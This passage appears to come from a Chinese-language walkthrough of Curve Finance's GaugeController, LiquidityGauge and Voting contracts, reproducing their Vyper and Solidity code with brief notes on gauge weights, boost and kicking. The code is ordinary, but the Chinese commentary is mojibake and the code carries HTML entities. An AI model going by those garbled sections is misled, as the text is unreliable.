= old_slope.slope * old_dt\n    new_slope: VotedSlope = VotedSlope(&#123;\n        slope: slope * _user_weight / 10000,\n        end: lock_end,\n        power: _user_weight\n    &#125;)\n    new_dt: uint256 = lock_end - next_time  # dev: raises when expired\n    new_bias: uint256 = new_slope.slope * new_dt\n\n    # Check and update powers (weights) used\n    power_used: uint256 = self.vote_user_power[msg.sender]\n    power_used = power_used + new_slope.power - old_slope.power\n    self.vote_user_power[msg.sender] = power_used\n    assert (power_used >= 0) and (power_used &lt;= 10000), 'Used too much power'\n\n    ## Remove old and schedule new slope changes\n    # Remove slope changes for old slopes\n    # Schedule recording of initial slope for next_time\n    old_weight_bias: uint256 = self._get_weight(_gauge_addr)\n    old_weight_slope: uint256 = self.points_weight[_gauge_addr][next_time].slope\n    old_sum_bias: uint256 = self._get_sum(gauge_type)\n    old_sum_slope: uint256 = self.points_sum[gauge_type][next_time].slope\n\n    self.points_weight[_gauge_addr][next_time].bias = max(old_weight_bias + new_bias, old_bias) - old_bias\n    self.points_sum[gauge_type][next_time].bias = max(old_sum_bias + new_bias, old_bias) - old_bias\n    if old_slope.end > next_time:\n        self.points_weight[_gauge_addr][next_time].slope = max(old_weight_slope + new_slope.slope, old_slope.slope) - old_slope.slope\n        self.points_sum[gauge_type][next_time].slope = max(old_sum_slope + new_slope.slope, old_slope.slope) - old_slope.slope\n    else:\n        self.points_weight[_gauge_addr][next_time].slope += new_slope.slope\n        self.points_sum[gauge_type][next_time].slope += new_slope.slope\n    if old_slope.end > block.timestamp:\n        # Cancel old slope changes if they still didn't happen\n        self.changes_weight[_gauge_addr][old_slope.end] -= old_slope.slope\n        self.changes_sum[gauge_type][old_slope.end] -= old_slope.slope\n    # Add slope changes for new slopes\n    self.changes_weight[_gauge_addr][new_slope.end] += new_slope.slope\n    self.changes_sum[gauge_type][new_slope.end] += new_slope.slope\n\n    self._get_total()\n\n    self.vote_user_slopes[msg.sender][_gauge_addr] = new_slope\n\n    # Record last action time\n    self.last_user_vote[msg.sender][_gauge_addr] = block.timestamp\n\n    log VoteForGauge(block.timestamp, msg.sender, _gauge_addr, _user_weight)\n\n\n@external\n@view\ndef get_gauge_weight(addr: address) -> uint256:\n    \"\"\"\n    @notice Get current gauge weight\n    @param addr Gauge address\n    @return Gauge weight\n    \"\"\"\n    return self.points_weight[addr][self.time_weight[addr]].bias\n\n\n@external\n@view\ndef get_type_weight(type_id: int128) -> uint256:\n    \"\"\"\n    @notice Get current type weight\n    @param type_id Type id\n    @return Type weight\n    \"\"\"\n    return self.points_type_weight[type_id][self.time_type_weight[type_id]]\n\n\n@external\n@view\ndef get_total_weight() -> uint256:\n    \"\"\"\n    @notice Get current total (type-weighted) weight\n    @return Total weight\n    \"\"\"\n    return self.points_total[self.time_total]\n\n\n@external\n@view\ndef get_weights_sum_per_type(type_id: int128) -> uint256:\n    \"\"\"\n    @notice Get sum of gauge weights per type\n    @param type_id Type id\n    @return Sum of gauge weights\n    \"\"\"\n    return self.points_sum[type_id][self.time_sum[type_id]].bias\n\n\n\nAnalyzeGaugeâ€”-Curveçš„ä¸“ç”¨åè¯ï¼Œæ„ä¸ºå‚¨è“„æ± å­\nå˜é‡åç§°åœ¨è¡ŒåŽç»™å‡ºäº†æ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šï¼Œå‡½æ•°å¼€å¤´ä¹Ÿåšå‡ºäº†åŠŸèƒ½è§£é‡Š\n_get_type_weightï¼Œ_get_sumï¼Œ_get_totalå‡½æ•°é€»è¾‘æ€§åŒï¼Œå¡«è¡¥åŽ†å²æ•°æ®å¹¶ä¸”è¿”å›žæœªæ¥ä¸€å‘¨çš„æ•°æ®\n_gauge_relative_weightå‡½æ•°è¿”å›ž*1e18çš„ç›¸å¯¹æƒé‡å€¼ï¼Œåœ¨Gaugeåˆçº¦å†…å‚ä¸Žrewardçš„è®¡ç®—\n\n_change_type_weightå‡½æ•°ä¸ºadd_typeå‡½æ•°ä»¥åŠchange_type_weightå‡½æ•°çš„æ ¸å¿ƒå‡½æ•°å®žçŽ°typeçš„å¢žåŠ ä»¥åŠæ›´æ”¹type_weightçš„åŠŸèƒ½\ndef _change_type_weight(type_id: int128, weight: uint256):\n    \"\"\"\n    @notice Change type weight\n    @param type_id Type id\n    @param weight New type weight\n    \"\"\"\n    old_weight: uint256 = self._get_type_weight(type_id)\n    old_sum: uint256 = self._get_sum(type_id)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    _total_weight = _total_weight + old_sum * weight - old_sum * old_weight\n    self.points_total[next_time] = _total_weight\n    self.points_type_weight[type_id][next_time] = weight\n    self.time_total = next_time\n    self.time_type_weight[type_id] = next_time\n\n    log NewTypeWeight(type_id, next_time, weight, _total_weight)\n\n\n\nOne Gauge(Gauge[0])Code\nClck to see more\n# @version 0.2.4\n\"\"\"\n@title Liquidity Gauge\n@author Curve Finance\n@license MIT\n@notice Used for measuring liquidity and insurance\n\"\"\"\n\nfrom vyper.interfaces import ERC20\n\ninterface CRV20:\n    def future_epoch_time_write() -> uint256: nonpayable\n    def rate() -> uint256: view\n\ninterface Controller:\n    def period() -> int128: view\n    def period_write() -> int128: nonpayable\n    def period_timestamp(p: int128) -> uint256: view\n    def gauge_relative_weight(addr: address, time: uint256) -> uint256: view\n    def voting_escrow() -> address: view\n    def checkpoint(): nonpayable\n    def checkpoint_gauge(addr: address): nonpayable\n\ninterface Minter:\n    def token() -> address: view\n    def controller() -> address: view\n    def minted(user: address, gauge: address) -> uint256: view\n\ninterface VotingEscrow:\n    def user_point_epoch(addr: address) -> uint256: view\n    def user_point_history__ts(addr: address, epoch: uint256) -> uint256: view\n\n\nevent Deposit:\n    provider: indexed(address)\n    value: uint256\n\nevent Withdraw:\n    provider: indexed(address)\n    value: uint256\n\nevent UpdateLiquidityLimit:\n    user: address\n    original_balance: uint256\n    original_supply: uint256\n    working_balance: uint256\n    working_supply: uint256\n\n\nTOKENLESS_PRODUCTION: constant(uint256) = 40\nBOOST_WARMUP: constant(uint256) = 2 * 7 * 86400\nWEEK: constant(uint256) = 604800\n\nminter: public(address)\ncrv_token: public(address)\nlp_token: public(address)\ncontroller: public(address)\nvoting_escrow: public(address)\nbalanceOf: public(HashMap[address, uint256])\ntotalSupply: public(uint256)\nfuture_epoch_time: public(uint256)\n\n# caller -> recipient -> can deposit?\napproved_to_deposit: public(HashMap[address, HashMap[address, bool]])\n\nworking_balances: public(HashMap[address, uint256])\nworking_supply: public(uint256)\n\n# The goal is to be able to calculate âˆ«(rate * balance / totalSupply dt) from 0 till checkpoint\n# All values are kept in units of being multiplied by 1e18\nperiod: public(int128)\nperiod_timestamp: public(uint256[100000000000000000000000000000])\n\n# 1e18 * âˆ«(rate(t) / totalSupply(t) dt) from 0 till checkpoint\nintegrate_inv_supply: public(uint256[100000000000000000000000000000])  # bump epoch when rate() changes\n\n# 1e18 * âˆ«(rate(t) / totalSupply(t) dt) from (last_action) till checkpoint\nintegrate_inv_supply_of: public(HashMap[address, uint256])\nintegrate_checkpoint_of: public(HashMap[address, uint256])\n\n\n# âˆ«(balance * rate(t) / totalSupply(t) dt) from 0 till checkpoint\n# Units: rate * t = already number of coins per address to issue\nintegrate_fraction: public(HashMap[address, uint256])\n\ninflation_rate: public(uint256)\n\n\n@external\ndef __init__(lp_addr: address, _minter: address):\n    \"\"\"\n    @notice Contract constructor\n    @param lp_addr Liquidity Pool contract address\n    @param _minter Minter contract address\n    \"\"\"\n\n    assert lp_addr != ZERO_ADDRESS\n    assert _minter != ZERO_ADDRESS\n\n    self.lp_token = lp_addr\n    self.minter = _minter\n    crv_addr: address = Minter(_minter).token()\n    self.crv_token = crv_addr\n    controller_addr: address = Minter(_minter).controller()\n    self.controller = controller_addr\n    self.voting_escrow = Controller(controller_addr).voting_escrow()\n    self.period_timestamp[0] = block.timestamp\n    self.inflation_rate = CRV20(crv_addr).rate()\n    self.future_epoch_time = CRV20(crv_addr).future_epoch_time_write()\n\n\n@internal\ndef _update_liquidity_limit(addr: address, l: uint256, L: uint256):\n    \"\"\"\n    @notice Calculate limits which depend on the amount of CRV token per-user.\n            Effectively it calculates working balances to apply amplification\n            of CRV production by CRV\n    @param addr User address\n    @param l User's amount of liquidity (LP tokens)\n    @param L Total amount of liquidity (LP tokens)\n    \"\"\"\n    # To be called after totalSupply is updated\n    _voting_escrow: address = self.voting_escrow\n    voting_balance: uint256 = ERC20(_voting_escrow).balanceOf(addr)\n    voting_total: uint256 = ERC20(_voting_escrow).totalSupply()\n\n    lim: uint256 = l * TOKENLESS_PRODUCTION / 100\n    if (voting_total > 0) and (block.timestamp > self.period_timestamp[0] + BOOST_WARMUP):\n        lim += L * voting_balance / voting_total * (100 - TOKENLESS_PRODUCTION) / 100\n\n    lim = min(l, lim)\n    old_bal: uint256 = self.working_balances[addr]\n    self.working_balances[addr] = lim\n    _working_supply: uint256 = self.working_supply + lim - old_bal\n    self.working_supply = _working_supply\n\n    log UpdateLiquidityLimit(addr, l, L, lim, _working_supply)\n\n\n@internal\ndef _checkpoint(addr: address):\n    \"\"\"\n    @notice Checkpoint for a user\n    @param addr User address\n    \"\"\"\n    _token: address = self.crv_token\n    _controller: address = self.controller\n    _period: int128 = self.period\n    _period_time: uint256 = self.period_timestamp[_period]\n    _integrate_inv_supply: uint256 = self.integrate_inv_supply[_period]\n    rate: uint256 = self.inflation_rate\n    new_rate: uint256 = rate\n    prev_future_epoch: uint256 = self.future_epoch_time\n    if prev_future_epoch >= _period_time:\n        self.future_epoch_time = CRV20(_token).future_epoch_time_write()\n        new_rate = CRV20(_token).rate()\n        self.inflation_rate = new_rate\n    Controller(_controller).checkpoint_gauge(self)\n\n    _working_balance: uint256 = self.working_balances[addr]\n    _working_supply: uint256 = self.working_supply\n\n    # Update integral of 1/supply\n    if block.timestamp > _period_time:\n        prev_week_time: uint256 = _period_time\n        week_time: uint256 = min((_period_time + WEEK) / WEEK * WEEK, block.timestamp)\n\n        for i in range(500):\n            dt: uint256 = week_time - prev_week_time\n            w: uint256 = Controller(_controller).gauge_relative_weight(self, prev_week_time / WEEK * WEEK)\n\n            if _working_supply > 0:\n                if prev_future_epoch >= prev_week_time and prev_future_epoch &lt; week_time:\n                    # If we went across one or multiple epochs, apply the rate\n                    # of the first epoch until it ends, and then the rate of\n                    # the last epoch.\n                    # If more than one epoch is crossed - the gauge gets less,\n                    # but that'd meen it wasn't called for more than 1 year\n                    _integrate_inv_supply += rate * w * (prev_future_epoch - prev_week_time) / _working_supply\n                    rate = new_rate\n                    _integrate_inv_supply += rate * w * (week_time - prev_future_epoch) / _working_supply\n                else:\n                    _integrate_inv_supply += rate * w * dt / _working_supply\n                # On precisions of the calculation\n                # rate ~= 10e18\n                # last_weight > 0.01 * 1e18 = 1e16 (if pool weight is 1%)\n                # _working_supply ~= TVL * 1e18 ~= 1e26 ($100M for example)\n                # The largest loss is at dt = 1\n                # Loss is 1e-9 - acceptable\n\n            if week_time == block.timestamp:\n                break\n            prev_week_time = week_time\n            week_time = min(week_time + WEEK, block.timestamp)\n\n    _period += 1\n    self.period = _period\n    self.period_timestamp[_period] = block.timestamp\n    self.integrate_inv_supply[_period] = _integrate_inv_supply\n\n    # Update user-specific integrals\n    self.integrate_fraction[addr] += _working_balance * (_integrate_inv_supply - self.integrate_inv_supply_of[addr]) / 10 ** 18\n    self.integrate_inv_supply_of[addr] = _integrate_inv_supply\n    self.integrate_checkpoint_of[addr] = block.timestamp\n\n\n@external\ndef user_checkpoint(addr: address) -> bool:\n    \"\"\"\n    @notice Record a checkpoint for `addr`\n    @param addr User address\n    @return bool success\n    \"\"\"\n    assert (msg.sender == addr) or (msg.sender == self.minter)  # dev: unauthorized\n    self._checkpoint(addr)\n    self._update_liquidity_limit(addr, self.balanceOf[addr], self.totalSupply)\n    return True\n\n\n@external\ndef claimable_tokens(addr: address) -> uint256:\n    \"\"\"\n    @notice Get the number of claimable tokens per user\n    @dev This function should be manually changed to \"view\" in the ABI\n    @return uint256 number of claimable tokens per user\n    \"\"\"\n    self._checkpoint(addr)\n    return self.integrate_fraction[addr] - Minter(self.minter).minted(addr, self)\n\n\n@external\ndef kick(addr: address):\n    \"\"\"\n    @notice Kick `addr` for abusing their boost\n    @dev Only if either they had another voting event, or their voting escrow lock expired\n    @param addr Address to kick\n    \"\"\"\n    _voting_escrow: address = self.voting_escrow\n    t_last: uint256 = self.integrate_checkpoint_of[addr]\n    t_ve: uint256 = VotingEscrow(_voting_escrow).user_point_history__ts(\n        addr, VotingEscrow(_voting_escrow).user_point_epoch(addr)\n    )\n    _balance: uint256 = self.balanceOf[addr]\n\n    assert ERC20(self.voting_escrow).balanceOf(addr) == 0 or t_ve > t_last # dev: kick not allowed\n    assert self.working_balances[addr] > _balance * TOKENLESS_PRODUCTION / 100  # dev: kick not needed\n\n    self._checkpoint(addr)\n    self._update_liquidity_limit(addr, self.balanceOf[addr], self.totalSupply)\n\n\n@external\ndef set_approve_deposit(addr: address, can_deposit: bool):\n    \"\"\"\n    @notice Set whether `addr` can deposit tokens for `msg.sender`\n    @param addr Address to set approval on\n    @param can_deposit bool - can this account deposit for `msg.sender`?\n    \"\"\"\n    self.approved_to_deposit[addr][msg.sender] = can_deposit\n\n\n@external\n@nonreentrant('lock')\ndef deposit(_value: uint256, addr: address = msg.sender):\n    \"\"\"\n    @notice Deposit `_value` LP tokens\n    @param _value Number of tokens to deposit\n    @param addr Address to deposit for\n    \"\"\"\n    if addr != msg.sender:\n        assert self.approved_to_deposit[msg.sender][addr], \"Not approved\"\n\n    self._checkpoint(addr)\n\n    if _value != 0:\n        _balance: uint256 = self.balanceOf[addr] + _value\n        _supply: uint256 = self.totalSupply + _value\n        self.balanceOf[addr] = _balance\n        self.totalSupply = _supply\n\n        self._update_liquidity_limit(addr, _balance, _supply)\n\n        assert ERC20(self.lp_token).transferFrom(msg.sender, self, _value)\n\n    log Deposit(addr, _value)\n\n\n@external\n@nonreentrant('lock')\ndef withdraw(_value: uint256):\n    \"\"\"\n    @notice Withdraw `_value` LP tokens\n    @param _value Number of tokens to withdraw\n    \"\"\"\n    self._checkpoint(msg.sender)\n\n    _balance: uint256 = self.balanceOf[msg.sender] - _value\n    _supply: uint256 = self.totalSupply - _value\n    self.balanceOf[msg.sender] = _balance\n    self.totalSupply = _supply\n\n    self._update_liquidity_limit(msg.sender, _balance, _supply)\n\n    assert ERC20(self.lp_token).transfer(msg.sender, _value)\n\n    log Withdraw(msg.sender, _value)\n\n\n@external\n@view\ndef integrate_checkpoint() -> uint256:\n    return self.period_timestamp[self.period]\n\n\n\nAnalyzeboostè®¡ç®—å…¬å¼ï¼š\n\nä»£ç å®žçŽ°æ–¹å¼ï¼š\n\næœ€ç»ˆç”¨æˆ·èŽ·å¾—çš„å¥–åŠ±åœ¨_checkpointå‡½æ•°ä¸­ç¡®å®šï¼š\ndef _checkpoint(addr: address):\n    \"\"\"\n    @notice Checkpoint for a user\n    @param addr User address\n    \"\"\"\n    _token: address = self.crv_token\n    _controller: address = self.controller\n    _period: int128 = self.period\n    _period_time: uint256 = self.period_timestamp[_period]\n    _integrate_inv_supply: uint256 = self.integrate_inv_supply[_period]\n    rate: uint256 = self.inflation_rate\n    new_rate: uint256 = rate\n    prev_future_epoch: uint256 = self.future_epoch_time\n    if prev_future_epoch >= _period_time:\n        self.future_epoch_time = CRV20(_token).future_epoch_time_write()\n        new_rate = CRV20(_token).rate()\n        self.inflation_rate = new_rate\n    Controller(_controller).checkpoint_gauge(self)\n\n    _working_balance: uint256 = self.working_balances[addr]\n    _working_supply: uint256 = self.working_supply\n\n    # Update integral of 1/supply\n    if block.timestamp > _period_time:\n        prev_week_time: uint256 = _period_time\n        week_time: uint256 = min((_period_time + WEEK) / WEEK * WEEK, block.timestamp)\n\n        for i in range(500):\n            dt: uint256 = week_time - prev_week_time\n            w: uint256 = Controller(_controller).gauge_relative_weight(self, prev_week_time / WEEK * WEEK)\n\n            if _working_supply > 0:\n                if prev_future_epoch >= prev_week_time and prev_future_epoch &lt; week_time:\n                    # If we went across one or multiple epochs, apply the rate\n                    # of the first epoch until it ends, and then the rate of\n                    # the last epoch.\n                    # If more than one epoch is crossed - the gauge gets less,\n                    # but that'd meen it wasn't called for more than 1 year\n                    _integrate_inv_supply += rate * w * (prev_future_epoch - prev_week_time) / _working_supply\n                    rate = new_rate\n                    _integrate_inv_supply += rate * w * (week_time - prev_future_epoch) / _working_supply\n                else:\n                    _integrate_inv_supply += rate * w * dt / _working_supply\n                # On precisions of the calculation\n                # rate ~= 10e18\n                # last_weight > 0.01 * 1e18 = 1e16 (if pool weight is 1%)\n                # _working_supply ~= TVL * 1e18 ~= 1e26 ($100M for example)\n                # The largest loss is at dt = 1\n                # Loss is 1e-9 - acceptable\n\n            if week_time == block.timestamp:\n                break\n            prev_week_time = week_time\n            week_time = min(week_time + WEEK, block.timestamp)\n\n    _period += 1\n    self.period = _period\n    self.period_timestamp[_period] = block.timestamp\n    self.integrate_inv_supply[_period] = _integrate_inv_supply\n\n    # Update user-specific integrals\n    self.integrate_fraction[addr] += _working_balance * (_integrate_inv_supply - self.integrate_inv_supply_of[addr]) / 10 ** 18\n    self.integrate_inv_supply_of[addr] = _integrate_inv_supply\n    self.integrate_checkpoint_of[addr] = block.timestamp\n\n\nä»¥weekåšè®¡ç®—ï¼Œç”±lockæ—¶é—´å’Œlock amountå…±åŒå†³å®š\n\n\nåœ¨è¿›è¡Œå¢žåŠ ï¼Œè®°å½•å¥–åŠ±æ•°é‡ï¼Œè®¡ç®—å¢žåŠ æ€»é‡å‡åŽ»ç”¨æˆ·ä½™é¢å³ä¸ºå¢žé‡ï¼Œç»“åˆminteråˆçº¦è¿›è¡Œå¥–åŠ±å‘æ”¾ï¼Œæ ¸å¿ƒå‡½æ•°å¦‚ä¸‹ï¼š\n\nå½“ç”¨æˆ·çš„lock tokenä¸º0 || lockè¿‡æœŸ||å¥–åŠ±tokenå¤§äºŽå®žé™…token*40%å³å¯è¢«kickæŽ‰\n\nå³åœ¨æ­¤å¤„å°†limæ›´æ–°ä¸º0ï¼Œåˆ™ä¸å†å‚ä¸Žå¥–åŠ±åˆ†å‘\nVotingCode\nClick to see more\ncontract Voting is IForwarder, AragonApp &#123;\n    using SafeMath for uint256;\n    using SafeMath64 for uint64;\n\n    uint128 private constant MAX_UINT_128 = 2 ** 128 - 1;\n    uint128 private constant MAX_UINT_64 = 2 ** 64 - 1;\n\n    bytes32 public constant CREATE_VOTES_ROLE = 0xe7dcd7275292e064d090fbc5f3bd7995be23b502c1fed5cd94cfddbbdcd32bbc; //keccak256(\"CREATE_VOTES_ROLE\");\n    bytes32 public constant MODIFY_SUPPORT_ROLE = 0xda3972983e62bdf826c4b807c4c9c2b8a941e1f83dfa76d53d6aeac11e1be650; //keccak256(\"MODIFY_SUPPORT_ROLE\");\n    bytes32 public constant MODIFY_QUORUM_ROLE = 0xad15e7261800b4bb73f1b69d3864565ffb1fd00cb93cf14fe48da8f1f2149f39; //keccak256(\"MODIFY_QUORUM_ROLE\");\n\n    bytes32 public constant SET_MIN_BALANCE_ROLE = 0xb1f3f26f63ad27cd630737a426f990492f5c674208299d6fb23bb2b0733d3d66; //keccak256(\"SET_MIN_BALANCE_ROLE\")\n    bytes32 public constant SET_MIN_TIME_ROLE = 0xe7ab0252519cd959720b328191bed7fe61b8e25f77613877be7070646d12daf0; //keccak256(\"SET_MIN_TIME_ROLE\")\n\n    bytes32 public constant ENABLE_VOTE_CREATION = 0xecb50dc3e77ba8a59697a3cc090a29b4cbd3c1f2b6b3aea524e0d166969592b9; //keccak256(\"ENABLE_VOTE_CREATION\")\n\n    bytes32 public constant DISABLE_VOTE_CREATION = 0x40b01f8b31b51596de2eeab8c325ff77cc3695c1c1875d66ff31176e7148d2a1; //keccack256(\"DISABLE_VOTE_CREATION\")\n\n    uint64 public constant PCT_BASE = 10 ** 18; // 0% = 0; 1% = 10^16; 100% = 10^18\n\n    string private constant ERROR_NO_VOTE = \"VOTING_NO_VOTE\";\n    string private constant ERROR_INIT_PCTS = \"VOTING_INIT_PCTS\";\n    string private constant ERROR_CHANGE_SUPPORT_PCTS = \"VOTING_CHANGE_SUPPORT_PCTS\";\n    string private constant ERROR_CHANGE_QUORUM_PCTS = \"VOTING_CHANGE_QUORUM_PCTS\";\n    string private constant ERROR_INIT_SUPPORT_TOO_BIG = \"VOTING_INIT_SUPPORT_TOO_BIG\";\n    string private constant ERROR_CHANGE_SUPPORT_TOO_BIG = \"VOTING_CHANGE_SUPP_TOO_BIG\";\n    string private constant ERROR_CAN_NOT_VOTE = \"VOTING_CAN_NOT_VOTE\";\n    string private constant ERROR_MALFORMED_CONTINUOUS_VOTE = \"MALFORMED_CONTINUOUS_VOTE\";\n    string private constant ERROR_CAN_NOT_EXECUTE = \"VOTING_CAN_NOT_EXECUTE\";\n    string private constant ERROR_CAN_NOT_FORWARD = \"VOTING_CAN_NOT_FORWARD\";\n    string private constant ERROR_NO_VOTING_POWER = \"VOTING_NO_VOTING_POWER\";\n\n    enum VoterState &#123; Absent, Yea, Nay, Even &#125;\n\n    struct Vote &#123;\n        bool executed;\n        uint64 startDate;\n        uint64 snapshotBlock;\n        uint64 supportRequiredPct;\n        uint64 minAcceptQuorumPct;\n        uint256 yea;\n        uint256 nay;\n        uint256 votingPower;\n        bytes executionScript;\n        mapping (address => VoterState) voters;\n    &#125;\n\n    MiniMeToken public token;\n    uint64 public supportRequiredPct;\n    uint64 public minAcceptQuorumPct;\n    uint64 public voteTime;\n\n    //2500000000000000000000\n    uint256 public minBalanceLowerLimit;\n    uint256 public minBalanceUpperLimit;\n    //43200\n    uint256 public minTimeLowerLimit;\n    //1209600\n    uint256 public minTimeUpperLimit;\n\n    uint256 public minBalance;\n    uint256 public minTime;\n\n    bool public enableVoteCreation;\n\n    // We are mimicing an array, we use a mapping instead to make app upgrade more graceful\n    mapping (uint256 => Vote) internal votes;\n    uint256 public votesLength;\n\n    mapping(address => uint256) public lastCreateVoteTimes;\n\n    event StartVote(uint256 indexed voteId, address indexed creator, string metadata, uint256 minBalance, uint256 minTime, uint256 totalSupply, uint256 creatorVotingPower);\n    event CastVote(uint256 indexed voteId, address indexed voter, bool supports, uint256 stake);\n    event ExecuteVote(uint256 indexed voteId);\n    event ChangeSupportRequired(uint64 supportRequiredPct);\n    event ChangeMinQuorum(uint64 minAcceptQuorumPct);\n\n    event MinimumBalanceSet(uint256 minBalance);\n    event MinimumTimeSet(uint256 minTime);\n\n    modifier voteExists(uint256 _voteId) &#123;\n        require(_voteId &lt; votesLength, ERROR_NO_VOTE);\n        _;\n    &#125;\n\n    modifier minBalanceCheck(uint256 _minBalance) &#123;\n        //_minBalance to be at least the equivalent of 10k locked for a year (1e18 precision)\n        require(_minBalance >= minBalanceLowerLimit &amp;&amp; _minBalance &lt;= minBalanceUpperLimit, \"Min balance should be within initialization hardcoded limits\");\n        _;\n    &#125;\n\n    modifier minTimeCheck(uint256 _minTime) &#123;\n        require(_minTime >= minTimeLowerLimit &amp;&amp; _minTime &lt;= minTimeUpperLimit, \"Min time should be within initialization hardcoded limits\");\n        _;\n    &#125;\n\n    /**\n        * @notice Initialize Voting app with `_token.symbol(): string` for governance, minimum support of `@formatPct(_supportRequiredPct)`%, minimum acceptance quorum of `@formatPct(_minAcceptQuorumPct)`%, and a voting duration of `@transformTime(_voteTime)`\n        * @param _token MiniMeToken Address that will be used as governance token\n        * @param _supportRequiredPct Percentage of yeas in casted votes for a vote to succeed (expressed as a percentage of 10^18; eg. 10^16 = 1%, 10^18 = 100%)\n        * @param _minAcceptQuorumPct Percentage of yeas in total possible votes for a vote to succeed (expressed as a percentage of 10^18; eg. 10^16 = 1%, 10^18 = 100%)\n        * @param _voteTime Seconds that a vote will be open for token holders to vote (unless enough yeas or nays have been cast to make an early decision)\n        * @param _minBalance Minumum balance that a token holder should have to create a new vote\n        * @param _minTime Minimum time between a user's previous vote and creating a new vote\n        * @param _minBalanceLowerLimit Hardcoded lower limit for _minBalance on initialization\n        * @param _minTimeLowerLimit Hardcoded lower limit for _minTime on initialization\n        * @param _minTimeUpperLimit Hardcoded upper limit for _minTime on initialization\n    */\n    function initialize(MiniMeToken _token, \n        uint64 _supportRequiredPct, \n        uint64 _minAcceptQuorumPct, \n        uint64 _voteTime,\n        uint256 _minBalance,\n        uint256 _minTime,\n        uint256 _minBalanceLowerLimit,\n        uint256 _minBalanceUpperLimit,\n        uint256 _minTimeLowerLimit,\n        uint256 _minTimeUpperLimit\n    ) external onlyInit &#123;\n        assert(CREATE_VOTES_ROLE == keccak256(\"CREATE_VOTES_ROLE\"));\n        assert(MODIFY_SUPPORT_ROLE == keccak256(\"MODIFY_SUPPORT_ROLE\"));\n        assert(MODIFY_QUORUM_ROLE == keccak256(\"MODIFY_QUORUM_ROLE\"));\n        assert(SET_MIN_BALANCE_ROLE == keccak256(\"SET_MIN_BALANCE_ROLE\"));\n        assert(SET_MIN_TIME_ROLE == keccak256(\"SET_MIN_TIME_ROLE\"));\n        assert(DISABLE_VOTE_CREATION == keccak256(\"DISABLE_VOTE_CREATION\"));\n        assert(ENABLE_VOTE_CREATION == keccak256(\"ENABLE_VOTE_CREATION\"));\n\n        initialized();\n\n        require(_minAcceptQuorumPct &lt;= _supportRequiredPct, ERROR_INIT_PCTS);\n        require(_supportRequiredPct &lt; PCT_BASE, ERROR_INIT_SUPPORT_TOO_BIG);\n\n        require(_minBalance >= _minBalanceLowerLimit &amp;&amp; _minBalance &lt;= _minBalanceUpperLimit);\n        require(_minTime >= _minTimeLowerLimit &amp;&amp; _minTime &lt;= _minTimeUpperLimit);\n\n        token = _token;\n        supportRequiredPct = _supportRequiredPct;\n        minAcceptQuorumPct = _minAcceptQuorumPct;\n        voteTime = _voteTime;\n\n        uint256 decimalsMul = uint256(10) ** token.decimals();\n\n        minBalance = _minBalance.mul(decimalsMul);\n        minTime = _minTime;\n\n        minBalanceLowerLimit = _minBalanceLowerLimit.mul(decimalsMul);\n        minBalanceUpperLimit = _minBalanceUpperLimit.mul(decimalsMul);\n        minTimeLowerLimit = _minTimeLowerLimit;\n        minTimeUpperLimit = _minTimeUpperLimit;\n\n        emit MinimumBalanceSet(minBalance);\n        emit MinimumTimeSet(minTime);\n\n        enableVoteCreation = true;\n    &#125;\n\n    /**\n    * @notice Change required support to `@formatPct(_supportRequiredPct)`%\n    * @param _supportRequiredPct New required support\n    */\n    function changeSupportRequiredPct(uint64 _supportRequiredPct)\n        external\n        authP(MODIFY_SUPPORT_ROLE, arr(uint256(_supportRequiredPct), uint256(supportRequiredPct)))\n    &#123;\n        require(minAcceptQuorumPct &lt;= _supportRequiredPct, ERROR_CHANGE_SUPPORT_PCTS);\n        require(_supportRequiredPct &lt; PCT_BASE, ERROR_CHANGE_SUPPORT_TOO_BIG);\n        supportRequiredPct = _supportRequiredPct;\n\n        emit ChangeSupportRequired(_supportRequiredPct);\n    &#125;\n\n    /**\n    * @notice Change minimum acceptance quorum to `@formatPct(_minAcceptQuorumPct)`%\n    * @param _minAcceptQuorumPct New acceptance quorum\n    */\n    function changeMinAcceptQuorumPct(uint64 _minAcceptQuorumPct)\n        external\n        authP(MODIFY_QUORUM_ROLE, arr(uint256(_minAcceptQuorumPct), uint256(minAcceptQuorumPct)))\n    &#123;\n        require(_minAcceptQuorumPct &lt;= supportRequiredPct, ERROR_CHANGE_QUORUM_PCTS);\n        minAcceptQuorumPct = _minAcceptQuorumPct;\n\n        emit ChangeMinQuorum(_minAcceptQuorumPct);\n    &#125;\n\n    /**\n    * @notice Change minimum balance needed to create a vote to `_minBalance`\n    * @param _minBalance New minimum balance\n    */\n\n    function setMinBalance(uint256 _minBalance) external auth(SET_MIN_BALANCE_ROLE) minBalanceCheck(_minBalance) &#123;\n        //min balance can't be set to lower than 10k * 1 year\n        minBalance = _minBalance;\n\n        emit MinimumBalanceSet(_minBalance);\n    &#125;\n\n    /**\n    * @notice Change minimum time needed to pass between user's previous vote and a user creating a new vote\n    * @param _minTime New minumum time\n    */\n\n    function setMinTime(uint256 _minTime) external auth(SET_MIN_TIME_ROLE) minTimeCheck(_minTime) &#123;\n        //min time should be within initialized hardcoded limits\n        minTime = _minTime;\n\n        emit MinimumTimeSet(_minTime);\n    &#125;\n\n    //later role will be set to 0x0 - noone\n    function disableVoteCreationOnce() external auth(DISABLE_VOTE_CREATION) &#123;\n        enableVoteCreation = false;\n    &#125;\n\n    function enableVoteCreationOnce() external auth(ENABLE_VOTE_CREATION) &#123;\n        enableVoteCreation = true;\n    &#125;\n\n    /**\n    * @notice Create a new vote about \"`_metadata`\"\n    * @param _executionScript EVM script to be executed on approval\n    * @param _metadata Vote metadata\n    * @return voteId Id for newly created vote\n    */\n    function newVote(bytes _executionScript, string _metadata) external auth(CREATE_VOTES_ROLE) returns (uint256 voteId) &#123;\n        return _newVote(_executionScript, _metadata, true, true);\n    &#125;\n\n    /**\n    * @notice Create a new vote about \"`_metadata`\"\n    * @param _executionScript EVM script to be executed on approval\n    * @param _metadata Vote metadata\n    * @param _castVote Whether to also cast newly created vote\n    * @param _executesIfDecided Whether to also immediately execute newly created vote if decided\n    * @return voteId id for newly created vote\n    */\n    function newVote(bytes _executionScript, string _metadata, bool _castVote, bool _executesIfDecided)\n        external\n        auth(CREATE_VOTES_ROLE)\n        returns (uint256 voteId)\n    &#123;\n        return _newVote(_executionScript, _metadata, _castVote, _executesIfDecided);\n    &#125;\n\n    /**\n    * @notice Vote a percentage value in favor of a vote\n    * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n    *      created via `newVote(),` which requires initialization\n    * @param _voteData Packed vote data containing both voteId and the vote in favor percentage 